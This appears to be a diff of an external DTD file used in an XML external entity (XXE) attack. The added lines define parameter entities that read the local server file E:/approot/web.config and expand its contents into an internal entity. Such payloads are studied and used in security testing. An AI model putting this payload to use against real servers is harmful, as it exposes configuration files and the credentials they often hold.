@@ -1,2 +1,3 @@
-<!ENTITY % three SYSTEM "file:///E:/approot/web.config">
-<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+<!ENTITY % payload SYSTEM "file:///E:/approot/web.config">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;
